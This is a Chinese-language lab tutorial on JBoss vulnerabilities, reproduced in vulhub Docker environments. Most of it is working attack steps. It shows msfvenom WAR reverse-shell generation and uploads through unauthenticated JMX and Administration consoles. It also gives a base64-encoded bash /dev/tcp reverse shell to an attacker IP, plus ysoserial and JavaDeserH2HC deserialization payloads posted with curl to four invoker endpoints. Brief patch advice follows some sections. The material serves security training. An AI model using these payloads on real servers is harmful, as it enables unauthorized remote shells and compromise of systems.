[TOC]



# ==JBOSS漏洞合集==

教材内容

# JBoss漏洞合集

 JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。

 JBoss有很多的有点，比如说：具有革命性的JMX为内核服务作为其总线结构，本身就是面向服务架构，具有统一的类装载器从而能够实现热部署和热邪在的能力，所以JBoss应用服务器是健壮的、高质量的，也具有良好的性能。2019年JBoss AS更名为WildFly。

## 一、JBoss未授权访问

### 1.JBoss6.x JMX Console未授权访问

#### 1.1 环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 6.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-12149/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

![image-20221025154350949](https://gitee.com/ymq_typroa/typroa/raw/main/202210261530366.png)

#### 1.2 生成war 木马

在msf里边生成war木马

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.17.15 LPORT=4444 -f war > shell.war
```

使用kali开启http服务

```
python3 -m http.server 80
```

接受反弹shell

```
use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcp set LHOST 192.168.17.15set LPORT 4444exploit
```

#### 1.3 上传木马

因为是模拟未授权访问，所以使用密码先登录就可以了，密码是admin/vulhub

平时就存储在/server/default/conf/props/jbossws-users.properties文件下

登陆进来选择service=MainDeployer

![image-20221025154636506](https://gitee.com/ymq_typroa/typroa/raw/main/202210261557258.png)

下边选择两个deploy的里边任意一个就可以了，输入开启的web服务对应的war木马文件，也就是http://192.168.17.15/shell.war

![image-20221025154714998](https://gitee.com/ymq_typroa/typroa/raw/main/202210261558874.png)

就上传成功了，开启kali监听然后访问目标就可以了，war里边的文件名是kali随机生成的

```
http://192.168.17.102:8080/shell/vbaulfplhl.jsp
```

![image-20221025155001000](https://gitee.com/ymq_typroa/typroa/raw/main/202210261602795.png)

kali可以看到连接上来的目标服务器

![image-20221025155410654](https://gitee.com/ymq_typroa/typroa/raw/main/202210261602429.png)

### 2.JBoss Administration Console未授权访问

#### 2.1 环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 6.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-12149/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

![image-20221025160158556](https://gitee.com/ymq_typroa/typroa/raw/main/202210261603176.png)

#### 2.2 上传木马

选择第一个Administration Console进去，因为是未授权访问所以输入一下账号和密码admin/vulhub

![image-20221025160222909](https://gitee.com/ymq_typroa/typroa/raw/main/202210261606127.png)

登录到登陆界面，找到下边的Web Application（WAR）s

![image-20221025160255924](https://gitee.com/ymq_typroa/typroa/raw/main/202210261613864.png)

可以看到上传war包，上传的时候保证这里是开启的

![image-20221025160450844](https://gitee.com/ymq_typroa/typroa/raw/main/202210261613654.png)

也是直接上传访问

```
http://192.168.17.102:8080/shell/vbaulfplhl.jsp
```

就可以连接到kali

![image-20221025160537334](https://gitee.com/ymq_typroa/typroa/raw/main/202210261614286.png)

## 二、JBoss反序列化漏洞

### 1.使用的反序列化工具

1.JavaDeserH2HC

https://github.com/joaomatosf/JavaDeserH2HC

2.ysoserial

https://github.com/frohoff/ysoserial

3.Deserialize

https://github.com/s0k/Deserialize

4.jexboss

https://github.com/joaomatosf/jexboss

这几个工具都可以用来生成反序列化的数据,在下面的反序列化漏洞中都是

ReadObject（）触发反序列化漏洞，所以都可以使用cc5链进行利用。

### 2.反序列化的原理

 前边已经分析过几条cc链的具体使用原理，我们就直接略过中间分析的部分，直接找到分序列化的入口点即可。

#### 2.1 cve-2015-7501

 此漏洞主要是由于JBoss中invoker/JMXInvokerServlet路径对外开放，由于JBoss的jmx组件支持Java反序列化，并且在反序列化过程中没有加入有效的安全检测机制，导致攻击者可以传入精心构造好的恶意序列化数据，在jmx对其进行反序列化处理时，导致传入的携带恶意代码的序列化数据执行，造成反序列化漏洞。

#### 2.2cve-2017-7504

 CVE-2017-7504出现在/jbossmq-httpil/HTTPServerILServlet路径下，和cve-2015-7501一样，在反序列化的过程中没有加入有效的安全检测机制使攻击代码可以通过反序列化的方式执行。

#### 2.3 cve-2017-12149

 此漏洞主要是由于jbossserveralldeployhttpha-invoker.sarinvoker.warWEB-INFclassesorgjbossinvocationhttpservlet目录下的ReadOnlyAccessFilter.class文件中的doFilter方法，再将序列化传入ois中，并没有进行过滤便调用了readObject()进行反序列化，导致传入的携带恶意代码的序列化数据执行.![image-20221027095359437](https://gitee.com/ymq_typroa/typroa/raw/main/202210270953513.png)

#### 2.4 cve-2013-4810

 此漏洞和CVE-2015-7501漏洞原理相同，web-console/Invoker利用的是org.jboss.console.remote.RemoteMBeanInvocation进行反序列化并上传构造的文件。

### 3.JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

#### 3.1 环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 4.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-7504/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

#### 3.2 漏洞测试

访问下边网站

```
http://192.168.17.102:8080/jbossmq-httpil/HTTPServerILServlet
```

看到显示如下说明漏洞存在

![image-20221026162345151](https://gitee.com/ymq_typroa/typroa/raw/main/202210261623179.png)

#### 3.3使用ysoserial生成payload

```
bash -i >& /dev/tcp/192.168.17.15/7777 0>&1
```

base64加密

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjE1Lzc3NzcgMD4mMQ==
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjE1Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}
```

生成反序列化payload

```
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3LjE1Lzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}" > hack.ser
```

使用curl上传内容

```
curl http://192.168.17.102:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @hack.ser
```

在kali 监听7777即可获取反弹shell

![image-20221026115634584](https://gitee.com/ymq_typroa/typroa/raw/main/202210261628410.png)

![image-20221026115644127](https://gitee.com/ymq_typroa/typroa/raw/main/202210261629481.png)

#### 3.4 使用JavaDeserH2HC生成payload

1.编译class文件

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

2.生成反序列化payload

```
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.17.15:7777
```

3.curl 提交payload

```
curl http://192.168.17.102:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

kali 监听即可获得反弹shell

![image-20221026163211502](https://gitee.com/ymq_typroa/typroa/raw/main/202210261632553.png)

![image-20221026163308614](https://gitee.com/ymq_typroa/typroa/raw/main/202210261633650.png)

#### 3.5 修复建议

 因为这类的反序列化都依赖于InvokerTransformer类。如果用户在正常业务中不使用此类，可以将此类移除。方法为使用Winzip打开jar文件，在org/apache/commons/collections/functors/InvokerTransformer.class删除该文件。

 或者升级JBoss到最新版本。

### 4.cve-2015-7501

#### 4.1环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 6.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-12149/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

#### 4.2 漏洞测试

访问下边的网站

```
http://192.168.17.102:8080/invoker/JMXInvokerServlet
```

出现下载界面说明漏洞存在

![image-20221026164055748](https://gitee.com/ymq_typroa/typroa/raw/main/202210261640776.png)

#### 4.3 使用JavaDeserH2HC生成payload

同上，生成payload提交即可

```java
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.17.15:7777
curl http://192.168.17.102:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

kali监听收到反弹shell

#### 4.4 修复建议

 因为这类的反序列化都依赖于InvokerTransformer类。如果用户在正常业务中不使用此类，可以将此类移除。方法为使用Winzip打开jar文件，在org/apache/commons/collections/functors/InvokerTransformer.class删除该文件。

 或者升级JBoss到最新版本。

### 5.JBoss 5.x/6.x反序列化（cve-2017-12149）

#### 5.1 环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 6.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-12149/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

#### 5.2 漏洞测试

漏洞出现在http invoker组件里边的ReadOnlyAccessFilter，访问

```
http://192.168.17.102:8080/invoker/readonly
```

出现界面如下说明漏洞存在

![image-20221026164640435](https://gitee.com/ymq_typroa/typroa/raw/main/202210261646511.png)

#### 5.3 使用JavaDeserH2HC生成payload

同上，生成payload提交即可

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.17.15:7777
curl http://192.168.17.102:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

使用kali监听收到反弹shell

![image-20221025103433685](https://gitee.com/ymq_typroa/typroa/raw/main/202210261647051.png)

![image-20221026164829340](https://gitee.com/ymq_typroa/typroa/raw/main/202210261648394.png)

#### 5.4 修复建议

 删除http-invoker.sar组件，路径如下jboss-6.1.0.Final\server\default\deploy\http-invoker.sar，或者升级JBoss到最新版本。

### 6.JBoss EJBInvokerServlet反序列化（cve-2013-4810）

#### 6.1环境搭建

服务器：CentOS7（IP：192.168.17.102）Jboss 6.x

攻击机：kali（IP：192.168.17.15）

使用vulhub的CVE-2017-12149漏洞环境

https://vulhub.org/#/environments/jboss/CVE-2017-12149/

进入到下载目录直接执行命令完成搭建

```
docker-compose up -d
```

访问目标网站即可

#### 6.2 漏洞测试

访问

```
http://192.168.17.102:8080/invoker/EJBInvokerServlet
```

出现下载说明漏洞存在

![image-20221026164950561](https://gitee.com/ymq_typroa/typroa/raw/main/202210261649588.png)

#### 6.3 使用JavaDeserH2HC生成payload

```
javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.17.15:7777
curl http://192.168.17.102:8080/invoker/EJBInvokerServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser
```

使用kali监听得到反弹shell

#### 6.4 修复建议

 因为这类的反序列化都依赖于InvokerTransformer类。如果用户在正常业务中不使用此类，可以将此类移除。方法为使用Winzip打开jar文件，在org/apache/commons/collections/functors/InvokerTransformer.class删除该文件。

 或者升级JBoss到最新版本。